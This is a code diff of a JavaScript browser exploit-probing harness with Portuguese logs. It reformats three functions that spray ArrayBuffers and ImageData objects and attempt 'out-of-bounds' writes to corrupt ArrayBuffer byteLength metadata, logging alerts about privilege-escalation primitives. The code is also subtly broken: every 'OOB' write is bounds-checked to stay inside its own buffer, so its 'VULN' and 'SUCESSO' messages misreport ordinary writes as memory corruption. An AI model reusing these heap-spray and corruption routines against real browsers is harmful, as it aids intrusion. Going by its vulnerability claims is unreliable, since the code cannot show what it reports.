-                     }
-                     try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){}
-                 }
-                 if(corruptionSuccess) break;
-                 await PAUSE(10);
-            }
-            if(corruptionSuccess){ logCanvas(`SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`, 'vuln', FNAME); } // Manter VULN
-            else if(writeSuccessCount === 0) { logCanvas(`Escrita OOB falhou/bloqueada em todos os offsets testados.`, 'good', FNAME); } // Manter GOOD específico
-            // Warn omitido
-            logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME); // Manter resumo
-            await PAUSE();
-        };
-
-        // --- Teste WebGL Deeper Plus --- (Logs info/subtest/warn omitidos)
-        const testWebGLDeeperPlus = async () => {
-             const FNAME = 'testWebGLDeeperPlus';
-             if(!glContext){ logCanvas("--- Teste: WebGL Deep Plus Pulado (WebGL N/A) ---",'test', FNAME); return; }
-             logCanvas(`--- Teste: WebGL Deep Plus c/ Checks (${isWebGL2?'WebGL2':'WebGL1'}) ---`,'test', FNAME);
-             let gl=glContext; let pgm=null, buf=null, vs=null, fs=null, tex=null;
-             let step='init'; let glError=gl.NO_ERROR; const errors=[];
-             const checkGLError=(s)=>{ let found=false; while((glError=gl.getError())!==gl.NO_ERROR){ let errorString = glError; for(let key in gl) { if(gl[key] === glError) { errorString = key; break; } } const eStr=`GL Err ${errorString} (0x${glError.toString(16)}) after ${s}`; logCanvas(eStr,'error', FNAME); errors.push(eStr); found=true; } return !found; }; // Manter ERROR
-
-             try{
-                 // Log contexto omitido
-                 checkGLError('getParam(VERSION)'); step='compileShaders';
-                 // Log compilação omitido
-                 const vsSrc=`attribute vec4 p; void main(){ gl_Position = vec4(p.xy * 0.5, 0.0, 1.0); }`;
-                 const fsSrc=`precision mediump float; uniform sampler2D u_tex; void main(){ gl_FragColor = texture2D(u_tex, vec2(0.5, 0.5)) * vec4(1.0, ${isWebGL2 ? '0.5' : '0.0'}, 0.0, 1.0); }`;
-                 vs=gl.createShader(gl.VERTEX_SHADER); if(!vs || !checkGLError('createShader(VS)')) throw new Error('Falha criar VS');
-                 gl.shaderSource(vs,vsSrc); if(!checkGLError('shaderSource(VS)')) throw new Error('Falha source VS');
-                 gl.compileShader(vs); if(!checkGLError('compileShader(VS)')) throw new Error('Falha compile VS');
-                 if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(vs); logCanvas(`Erro Compilar VS: ${infoLog}`, 'error', FNAME); throw new Error(`VS Compile: ${infoLog}`); } // Manter ERROR
-                 fs=gl.createShader(gl.FRAGMENT_SHADER); if(!fs || !checkGLError('createShader(FS)')) throw new Error('Falha criar FS');
-                 gl.shaderSource(fs,fsSrc); if(!checkGLError('shaderSource(FS)')) throw new Error('Falha source FS');
-                 gl.compileShader(fs); if(!checkGLError('compileShader(FS)')) throw new Error('Falha compile FS');
-                 if(!gl.getShaderParameter(fs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(fs); logCanvas(`Erro Compilar FS: ${infoLog}`, 'error', FNAME); throw new Error(`FS Compile: ${infoLog}`); } // Manter ERROR
-
-                 step='linkProgram'; // Log link omitido
-                 pgm=gl.createProgram(); if(!pgm || !checkGLError('createProgram')) throw new Error('Falha createProgram');
-                 gl.attachShader(pgm,vs); if(!checkGLError('attachVS')) throw new Error('Falha attachVS');
-                 gl.attachShader(pgm,fs); if(!checkGLError('attachFS')) throw new Error('Falha attachFS');
-                 gl.linkProgram(pgm); if(!checkGLError('linkProgram')) throw new Error('Falha linkProgram');
-                 if(!gl.getProgramParameter(pgm,gl.LINK_STATUS)){ const infoLog = gl.getProgramInfoLog(pgm); logCanvas(`Erro Linkar Programa: ${infoLog}`, 'error', FNAME); throw new Error(`Link: ${infoLog}`); } // Manter ERROR
-                 gl.useProgram(pgm); if(!checkGLError('useProgram')) throw new Error('Falha useProgram');
-
-                 step='textureSetup'; // Log setup omitido
-                 tex=gl.createTexture(); if(!tex || !checkGLError('createTexture')) throw new Error('Falha createTexture');
-                 gl.bindTexture(gl.TEXTURE_2D,tex); if(!checkGLError('bindTexture')) throw new Error('Falha bindTexture');
-                 if(ctx){ ctx.save(); ctx.fillStyle='lime'; ctx.fillRect(50,150,40,40); ctx.fillStyle='black'; ctx.font='bold 12px mono'; ctx.fillText('TEX',55,175); ctx.restore(); }
-                 await PAUSE(20);
-                 gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvasElement); if(!checkGLError('texImage2D')) throw new Error('Falha texImage2D');
-                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST); if(!checkGLError('texParamMag')) throw new Error('Falha texParamMag');
-                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST); if(!checkGLError('texParamMin')) throw new Error('Falha texParamMin');
-                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapS')) throw new Error('Falha texParamWrapS');
-                 gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapT')) throw new Error('Falha texParamWrapT');
-
-                 step='uniformTex'; const texLoc = gl.getUniformLocation(pgm, 'u_tex'); if(!checkGLError('getUniLocTex')) throw new Error('Falha getUniLocTex');
-                 if(texLoc){ gl.uniform1i(texLoc, 0); if(!checkGLError('uniform1i')) throw new Error('Falha uniform1i'); }
-
-                 step='createBufferDraw'; // Log buffer omitido
-                 buf=gl.createBuffer(); if(!buf || !checkGLError('createBuf')) throw new Error('Falha createBuf');
-                 gl.bindBuffer(gl.ARRAY_BUFFER,buf); if(!checkGLError('bindBuf')) throw new Error('Falha bindBuf');
-                 const pos=new Float32Array([-1,-1, 1,-1, -1, 1]);
-                 gl.bufferData(gl.ARRAY_BUFFER, pos, gl.STATIC_DRAW); if(!checkGLError('bufData')) throw new Error('Falha bufData');
-
-                 step='vertexAttrib'; const loc=gl.getAttribLocation(pgm,"p");
-                 if (loc < 0) { checkGLError('getAttribLoc(p)'); throw new Error("Atributo 'p' não encontrado no shader."); } // Manter ERROR
-                 if(!checkGLError('getAttribLoc(p)')) throw new Error('Falha getAttribLoc');
-                 gl.enableVertexAttribArray(loc); if(!checkGLError('enableVA')) throw new Error('Falha enableVA');
-                 gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0); if(!checkGLError('vertexAttribPtr')) throw new Error('Falha vertexAttribPtr');
-
-                 step='draw'; const glViewportX = 250; const glViewportY = 50; const glViewportW = 90; const glViewportH = 90;
-                 gl.viewport(glViewportX, glViewportY, glViewportW, glViewportH); if(!checkGLError('viewport')) throw new Error('Falha viewport');
-                 gl.clearColor(0.1, 0.1, 0.2, 1.0); if(!checkGLError('clearColor')) throw new Error('Falha clearColor');
-                 gl.clear(gl.COLOR_BUFFER_BIT); if(!checkGLError('clear')) throw new Error('Falha clear');
-                 gl.activeTexture(gl.TEXTURE0); if(!checkGLError('activeTex')) throw new Error('Falha activeTex');
-                 gl.bindTexture(gl.TEXTURE_2D, tex); if(!checkGLError('bindTexDraw')) throw new Error('Falha bindTexDraw');
-                 gl.drawArrays(gl.TRIANGLES, 0, 3); // Log info omitido
-                 if(!checkGLError('drawArrays')) {
-                    // Log good omitido
-                 } else { throw new Error('Erro GL após drawArrays'); } // Erro será logado pelo checkGLError
-
-                 if(errors.length === 0){
-                     // Log good omitido
-                 }
-
-             }catch(e){
-                 logCanvas(`Erro fatal durante Teste WebGL Deep Plus (etapa ${step}): ${e.message}`,'error', FNAME); // Manter ERROR
-                 console.error(e); checkGLError(`error_catch_${step}`);
-             }finally{ // Limpeza
-                 if(gl){ try{gl.bindBuffer(gl.ARRAY_BUFFER,null);}catch(e){} try{gl.bindTexture(gl.TEXTURE_2D,null);}catch(e){} try{gl.useProgram(null);}catch(e){} if(pgm && vs){try{gl.detachShader(pgm, vs);}catch(e){}} if(pgm && fs){try{gl.detachShader(pgm, fs);}catch(e){}} if(vs){try{gl.deleteShader(vs);}catch(e){}} if(fs){try{gl.deleteShader(fs);}catch(e){}} if(pgm){try{gl.deleteProgram(pgm);}catch(e){}} if(buf){try{gl.deleteBuffer(buf);}catch(e){}} if(tex){try{gl.deleteTexture(tex);}catch(e){}} }
-             }
-             logCanvas("--- Teste WebGL Deep Plus Concluído ---",'test', FNAME); // Manter resumo
-             await PAUSE();
-        };
-
-        // --- Teste OOB Write -> ImageData Check --- (Logs info/subtest/warn omitidos)
-        const testOOBWriteToImageDataCheck = async () => {
-            const FNAME = 'testOOBWriteToImageDataCheck';
-            logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME);
-            const spraySize=30; const imgDataWidth=10; const imgDataHeight=10; const bufferOOBSize=64;
-            const writeValue1=0x42424242; const writeValue2=0x43434343; const writeValueSize = 8;
-            const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128;
-            const sprayedImagesData = []; let bufferOOB=null; let dv=null;
-            let oobWritePerformed = false; let potentialCorruptionDetected = false; let patternMatched = false;
-            // Log config omitido
-            try{ // Log alocação omitido
-                bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB);
-                for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC);
-            }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return; } // Manter ERROR
-
-            // Log spray omitido
-            const totalPixels = imgDataWidth * imgDataHeight; const initialByteArray = new Uint8ClampedArray(totalPixels * 4);
-            for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; }
-            for(let i=0; i<spraySize; i++){ try{ let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight); sprayedImagesData.push(imgData); }catch(e){ /* Warn omitido */ break; } }
-            // Log contagem omitido
-            await PAUSE();
-
-            const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`;
-            // Log tentativa omitido
-            try{
-                if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){
-                    dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true);
-                    logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME); // Manter VULN
-                     logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME); // Manter ESCALATION
-                    oobWritePerformed = true;
-                } else { logCanvas(`Offset OOB ${relOffsetStr} fora do buffer de controle alocado.`, 'error', FNAME); } // Manter ERROR
-            }catch(e){ /* Warn omitido */ }
-            await PAUSE();
-
-            // Log verificação omitido
-            if(!ctx){ logCanvas("Contexto 2D não disponível para put/getImageData.", 'warn', FNAME); /* ... */ return; } // Warn omitido
-            ctx.fillStyle="#111"; ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80);
-            const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); const startY = 60;
-
-            for(let i=0; i<sprayedImagesData.length; i++){
-                 const gridX = 10 + (i % cols) * (imgDataWidth + 1); const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1);
-                 if (gridY + imgDataHeight > canvasElement.height - 15) { continue; }
-                 try{
-                    const currentImageData = sprayedImagesData[i]; if (!currentImageData) continue;
-                    ctx.putImageData(currentImageData, gridX, gridY);
-                     const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight);
-                     const readbackData = readbackImageData.data;
-                     for(let k=0; k < readbackData.length; k += 4){
-                         const r = readbackData[k]; const g = readbackData[k+1]; const b = readbackData[k+2]; const a = readbackData[k+3];
-                         if(r !== 255 || g !== 255 || b !== 255 || a !== 255){
-                             const pixelIndex = k / 4;
-                             logCanvas(`---> CORRUPÇÃO DETECTADA em ImageData ${i} @ pixel ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); // Manter CRITICAL
-                             potentialCorruptionDetected = true;
-                             const byte1 = writeValue1 & 0xFF; const byte2 = (writeValue1 >> 8) & 0xFF; const byte3 = (writeValue1 >> 16) & 0xFF; const byte4 = (writeValue1 >> 24) & 0xFF;
-                             let matchesPattern = false;
-                              if (r === byte1 && g === byte2 && b === byte3 && a === byte4) {
-                                 matchesPattern = true;
-                                 logCanvas(`    -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME); // Manter VULN
-                              } /* else if (aproximação padrão 2...) */
-                             if (matchesPattern) {
-                                 patternMatched = true;
-                                 logCanvas(` ---> *** ALERTA: Padrão OOB Write específico lido de volta do ImageData! Confirma Corrupção Controlada! ***`, 'escalation', FNAME); // Manter ESCALATION
-                             }
-                             break;
-                         }
-                     }
-                 }catch(e){
-                     logCanvas(`Erro durante put/getImageData para ImageData ${i}: ${e.message}`, 'error', FNAME); // Manter ERROR
-                     console.error(`Erro ImgData ${i}:`, e); potentialCorruptionDetected = true;
-                 }
-                 if(i % 5 === 0) await PAUSE(5);
-            }
-
-            // Log conclusão verificação omitido
-            if (patternMatched) { logCanvas(`SUCESSO: Corrupção detectada E padrão OOB escrito foi lido de volta de um ImageData!`, 'vuln', FNAME); } // Manter VULN
-            else if (potentialCorruptionDetected) {
-                 logCanvas(`AVISO: Corrupção/Erro detectado em algum ImageData, mas padrão OOB específico não foi confirmado na leitura.`, 'warn', FNAME); // Manter WARN para este caso
-                 logCanvas(` ---> *** ALERTA: Corrupção de memória instável detectada afetando ImageData! Investigar. ***`, 'escalation', FNAME); // Manter ESCALATION
-            }
-            else if (!oobWritePerformed && !potentialCorruptionDetected) {
-                // Apenas logar se a escrita falhou E não houve corrupção
-                 logCanvas(`Nenhuma corrupção detectada e escrita OOB não foi realizada/falhou.`, 'good', FNAME); // Manter GOOD específico
-            }
-            // Log visual omitido
-
-            logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME); // Manter resumo
-            await PAUSE();
-        };
+        // testOOBWriteMetadata, testWebGLDeeperPlus, testOOBWriteToImageDataCheck, testOOBWriteOnly
+        // (código da v15, logs já filtrados)
+        const testOOBWriteMetadata = async () => { /* ...código v15... */ const FNAME='testOOBWriteMetadata'; logCanvas("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME); const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false; const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128; try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro fatal ao alocar buffer de controle: ${e.message}`, 'error', FNAME); console.error(e); return; } for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){ } } await PAUSE(); const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; let foundOffset=-1; for(const tryOffset of metadataOffsetsToTry){ const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset; const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`; let currentWriteOK=false; try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; } }catch(e){} if(currentWriteOK){ for(let j=0; j<targetBuffers.length; j++){ try { if(targetBuffers[j] && targetBuffers[j].byteLength === targetValue){ logCanvas(`---> VULN: ArrayBuffer alvo ${j} teve seu byteLength CORROMPIDO para ${toHexCanvas(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Metadados OOB Write -> Read/Write Primitivo Poderoso) ***`, 'escalation', FNAME); corruptionSuccess=true; foundOffset=tryOffset; try{ const corruptedView=new DataView(targetBuffers[j]); const readOOBAddr = targetBufferSize + 4; const readOOBValue = corruptedView.getUint32(readOOBAddr, true); logCanvas(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHexCanvas(readOOBValue)}`, 'leak', FNAME); logCanvas(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME); }catch(eRead){} break; } } catch(eCheck) { logCanvas(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME); } } try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, 0xDDDDDDDD, true); } }catch(eRestore){} } if(corruptionSuccess) break; await PAUSE(10); } if(corruptionSuccess){ logCanvas(`SUCESSO! byteLength corrompido usando offset relativo ctrlEnd+${foundOffset}.`, 'vuln', FNAME); } else if(writeSuccessCount === 0) { logCanvas(`Escrita OOB falhou/bloqueada em todos os offsets testados.`, 'good', FNAME); } logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test', FNAME); await PAUSE(); };
+        const testWebGLDeeperPlus = async () => { /* ...código v15... */ const FNAME='testWebGLDeeperPlus'; if(!glContext){ logCanvas("--- Teste: WebGL Deep Plus Pulado (WebGL N/A) ---",'test', FNAME); return; } logCanvas(`--- Teste: WebGL Deep Plus c/ Checks (${isWebGL2?'WebGL2':'WebGL1'}) ---`,'test', FNAME); let gl=glContext; let pgm=null, buf=null, vs=null, fs=null, tex=null; let step='init'; let glError=gl.NO_ERROR; const errors=[]; const checkGLError=(s)=>{ let found=false; while((glError=gl.getError())!==gl.NO_ERROR){ let errorString = glError; for(let key in gl) { if(gl[key] === glError) { errorString = key; break; } } const eStr=`GL Err ${errorString} (0x${glError.toString(16)}) after ${s}`; logCanvas(eStr,'error', FNAME); errors.push(eStr); found=true; } return !found; }; try{ checkGLError('getParam(VERSION)'); step='compileShaders'; const vsSrc=`attribute vec4 p; void main(){ gl_Position = vec4(p.xy * 0.5, 0.0, 1.0); }`; const fsSrc=`precision mediump float; uniform sampler2D u_tex; void main(){ gl_FragColor = texture2D(u_tex, vec2(0.5, 0.5)) * vec4(1.0, ${isWebGL2 ? '0.5' : '0.0'}, 0.0, 1.0); }`; vs=gl.createShader(gl.VERTEX_SHADER); if(!vs || !checkGLError('createShader(VS)')) throw new Error('Falha criar VS'); gl.shaderSource(vs,vsSrc); if(!checkGLError('shaderSource(VS)')) throw new Error('Falha source VS'); gl.compileShader(vs); if(!checkGLError('compileShader(VS)')) throw new Error('Falha compile VS'); if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(vs); logCanvas(`Erro Compilar VS: ${infoLog}`, 'error', FNAME); throw new Error(`VS Compile: ${infoLog}`); } fs=gl.createShader(gl.FRAGMENT_SHADER); if(!fs || !checkGLError('createShader(FS)')) throw new Error('Falha criar FS'); gl.shaderSource(fs,fsSrc); if(!checkGLError('shaderSource(FS)')) throw new Error('Falha source FS'); gl.compileShader(fs); if(!checkGLError('compileShader(FS)')) throw new Error('Falha compile FS'); if(!gl.getShaderParameter(fs,gl.COMPILE_STATUS)){ const infoLog = gl.getShaderInfoLog(fs); logCanvas(`Erro Compilar FS: ${infoLog}`, 'error', FNAME); throw new Error(`FS Compile: ${infoLog}`); } step='linkProgram'; pgm=gl.createProgram(); if(!pgm || !checkGLError('createProgram')) throw new Error('Falha createProgram'); gl.attachShader(pgm,vs); if(!checkGLError('attachVS')) throw new Error('Falha attachVS'); gl.attachShader(pgm,fs); if(!checkGLError('attachFS')) throw new Error('Falha attachFS'); gl.linkProgram(pgm); if(!checkGLError('linkProgram')) throw new Error('Falha linkProgram'); if(!gl.getProgramParameter(pgm,gl.LINK_STATUS)){ const infoLog = gl.getProgramInfoLog(pgm); logCanvas(`Erro Linkar Programa: ${infoLog}`, 'error', FNAME); throw new Error(`Link: ${infoLog}`); } gl.useProgram(pgm); if(!checkGLError('useProgram')) throw new Error('Falha useProgram'); step='textureSetup'; tex=gl.createTexture(); if(!tex || !checkGLError('createTexture')) throw new Error('Falha createTexture'); gl.bindTexture(gl.TEXTURE_2D,tex); if(!checkGLError('bindTexture')) throw new Error('Falha bindTexture'); if(ctx){ ctx.save(); ctx.fillStyle='lime'; ctx.fillRect(50,150,40,40); ctx.fillStyle='black'; ctx.font='bold 12px mono'; ctx.fillText('TEX',55,175); ctx.restore(); } await PAUSE(20); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvasElement); if(!checkGLError('texImage2D')) throw new Error('Falha texImage2D'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST); if(!checkGLError('texParamMag')) throw new Error('Falha texParamMag'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST); if(!checkGLError('texParamMin')) throw new Error('Falha texParamMin'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapS')) throw new Error('Falha texParamWrapS'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapT')) throw new Error('Falha texParamWrapT'); step='uniformTex'; const texLoc = gl.getUniformLocation(pgm, 'u_tex'); if(!checkGLError('getUniLocTex')) throw new Error('Falha getUniLocTex'); if(texLoc){ gl.uniform1i(texLoc, 0); if(!checkGLError('uniform1i')) throw new Error('Falha uniform1i'); } step='createBufferDraw'; buf=gl.createBuffer(); if(!buf || !checkGLError('createBuf')) throw new Error('Falha createBuf'); gl.bindBuffer(gl.ARRAY_BUFFER,buf); if(!checkGLError('bindBuf')) throw new Error('Falha bindBuf'); const pos=new Float32Array([-1,-1, 1,-1, -1, 1]); gl.bufferData(gl.ARRAY_BUFFER, pos, gl.STATIC_DRAW); if(!checkGLError('bufData')) throw new Error('Falha bufData'); step='vertexAttrib'; const loc=gl.getAttribLocation(pgm,"p"); if (loc < 0) { checkGLError('getAttribLoc(p)'); throw new Error("Atributo 'p' não encontrado no shader."); } if(!checkGLError('getAttribLoc(p)')) throw new Error('Falha getAttribLoc'); gl.enableVertexAttribArray(loc); if(!checkGLError('enableVA')) throw new Error('Falha enableVA'); gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0); if(!checkGLError('vertexAttribPtr')) throw new Error('Falha vertexAttribPtr'); step='draw'; const glViewportX = 250; const glViewportY = 50; const glViewportW = 90; const glViewportH = 90; gl.viewport(glViewportX, glViewportY, glViewportW, glViewportH); if(!checkGLError('viewport')) throw new Error('Falha viewport'); gl.clearColor(0.1, 0.1, 0.2, 1.0); if(!checkGLError('clearColor')) throw new Error('Falha clearColor'); gl.clear(gl.COLOR_BUFFER_BIT); if(!checkGLError('clear')) throw new Error('Falha clear'); gl.activeTexture(gl.TEXTURE0); if(!checkGLError('activeTex')) throw new Error('Falha activeTex'); gl.bindTexture(gl.TEXTURE_2D, tex); if(!checkGLError('bindTexDraw')) throw new Error('Falha bindTexDraw'); gl.drawArrays(gl.TRIANGLES, 0, 3); if(!checkGLError('drawArrays')) {} else { throw new Error('Erro GL após drawArrays'); } }catch(e){ logCanvas(`Erro fatal durante Teste WebGL Deep Plus (etapa ${step}): ${e.message}`,'error', FNAME); console.error(e); checkGLError(`error_catch_${step}`); }finally{ if(gl){ try{gl.bindBuffer(gl.ARRAY_BUFFER,null);}catch(e){} try{gl.bindTexture(gl.TEXTURE_2D,null);}catch(e){} try{gl.useProgram(null);}catch(e){} if(pgm && vs){try{gl.detachShader(pgm, vs);}catch(e){}} if(pgm && fs){try{gl.detachShader(pgm, fs);}catch(e){}} if(vs){try{gl.deleteShader(vs);}catch(e){}} if(fs){try{gl.deleteShader(fs);}catch(e){}} if(pgm){try{gl.deleteProgram(pgm);}catch(e){}} if(buf){try{gl.deleteBuffer(buf);}catch(e){}} if(tex){try{gl.deleteTexture(tex);}catch(e){}} } } logCanvas("--- Teste WebGL Deep Plus Concluído ---",'test', FNAME); await PAUSE(); };
+        const testOOBWriteToImageDataCheck = async () => { /* ...código v15... */ const FNAME='testOOBWriteToImageDataCheck'; logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test', FNAME); const spraySize=30; const imgDataWidth=10; const imgDataHeight=10; const bufferOOBSize=64; const writeValue1=0x42424242; const writeValue2=0x43434343; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; const sprayedImagesData = []; let bufferOOB=null; let dv=null; let oobWritePerformed = false; let potentialCorruptionDetected = false; let patternMatched = false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); }catch(e){ logCanvas(`Erro fatal alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return; } const totalPixels = imgDataWidth * imgDataHeight; const initialByteArray = new Uint8ClampedArray(totalPixels * 4); for (let j = 0; j < initialByteArray.length; j++) { initialByteArray[j] = 255; } for(let i=0; i<spraySize; i++){ try{ let imgData = new ImageData(initialByteArray, imgDataWidth, imgDataHeight); sprayedImagesData.push(imgData); }catch(e){ break; } } await PAUSE(); const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME); oobWritePerformed = true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora do buffer de controle alocado.`, 'error', FNAME); } }catch(e){ } await PAUSE(); if(!ctx){ logCanvas("Contexto 2D não disponível para put/getImageData.", 'warn', FNAME); logCanvas("--- Teste OOB Write -> ImageData Check Concluído (Sem verificação visual) ---",'test', FNAME); await PAUSE(); return; } ctx.fillStyle="#111"; ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80); const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); const startY = 60; for(let i=0; i<sprayedImagesData.length; i++){ const gridX = 10 + (i % cols) * (imgDataWidth + 1); const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1); if (gridY + imgDataHeight > canvasElement.height - 15) { continue; } try{ const currentImageData = sprayedImagesData[i]; if (!currentImageData) continue; ctx.putImageData(currentImageData, gridX, gridY); const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight); const readbackData = readbackImageData.data; for(let k=0; k < readbackData.length; k += 4){ const r = readbackData[k]; const g = readbackData[k+1]; const b = readbackData[k+2]; const a = readbackData[k+3]; if(r !== 255 || g !== 255 || b !== 255 || a !== 255){ const pixelIndex = k / 4; logCanvas(`---> CORRUPÇÃO DETECTADA em ImageData ${i} @ pixel ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); potentialCorruptionDetected = true; const byte1 = writeValue1 & 0xFF; const byte2 = (writeValue1 >> 8) & 0xFF; const byte3 = (writeValue1 >> 16) & 0xFF; const byte4 = (writeValue1 >> 24) & 0xFF; let matchesPattern = false; if (r === byte1 && g === byte2 && b === byte3 && a === byte4) { matchesPattern = true; logCanvas(`    -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME); } if (matchesPattern) { patternMatched = true; logCanvas(` ---> *** ALERTA: Padrão OOB Write específico lido de volta do ImageData! Confirma Corrupção Controlada! ***`, 'escalation', FNAME); } break; } } }catch(e){ logCanvas(`Erro durante put/getImageData para ImageData ${i}: ${e.message}`, 'error', FNAME); console.error(`Erro ImgData ${i}:`, e); potentialCorruptionDetected = true; } if(i % 5 === 0) await PAUSE(5); } if (patternMatched) { logCanvas(`SUCESSO: Corrupção detectada E padrão OOB escrito foi lido de volta de um ImageData!`, 'vuln', FNAME); } else if (potentialCorruptionDetected) { logCanvas(`AVISO: Corrupção/Erro detectado em algum ImageData, mas padrão OOB específico não foi confirmado na leitura.`, 'warn', FNAME); logCanvas(` ---> *** ALERTA: Corrupção de memória instável detectada afetando ImageData! Investigar. ***`, 'escalation', FNAME); } else if (!oobWritePerformed && !potentialCorruptionDetected) { logCanvas(`Nenhuma corrupção detectada e escrita OOB não foi realizada/falhou.`, 'good', FNAME); } logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME); await PAUSE(); };
